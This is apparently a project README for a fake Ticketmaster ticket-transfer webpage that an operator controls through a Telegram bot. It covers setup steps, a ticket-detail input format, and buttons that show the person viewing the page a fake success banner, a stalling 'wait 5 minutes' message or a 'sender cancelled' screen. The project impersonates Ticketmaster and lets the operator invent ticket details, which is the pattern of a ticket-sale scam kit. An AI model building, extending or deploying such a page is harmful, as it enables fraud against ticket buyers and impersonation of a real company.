# Ticketmaster Ticket Transfer App

This project allows you to manage a Ticketmaster ticket transfer workflow directly from Telegram!

## Features
- **Sender Name & Ticket Details Input**: When a user clicks "Accept Tickets", your Telegram bot (`@Ticketcancellabot`) prompts you to enter the ticket details.
- **Dynamic Webpage Update**: The webpage automatically updates with the sender name, event title, date, time, venue, seats, quantity, and deadline.
- **Telegram Remote Controls**:
  - `✅ Complete`: Shows a success banner with a celebratory fireworks/confetti splash!
  - `⏱️ Delay`: Shows a 5-minute wait notification asking the user to wait for tickets to reflect in their account.
  - `❌ Cancel Transfer`: Updates the screen stating the sender has cancelled the transfer.

## How to Run in VS Code
1. Unzip `ticketmaster_transfer_app.zip`.
2. Open the unzipped folder in VS Code.
3. Open `index.html` using the **Live Server** extension or directly in any browser.
4. When a user taps **Accept Tickets**, check your Telegram chat (`7646203613`) and send ticket details in this format:
   `Sender Name | Event Title | Date | Time | Venue | Seats | Quantity | Deadline`
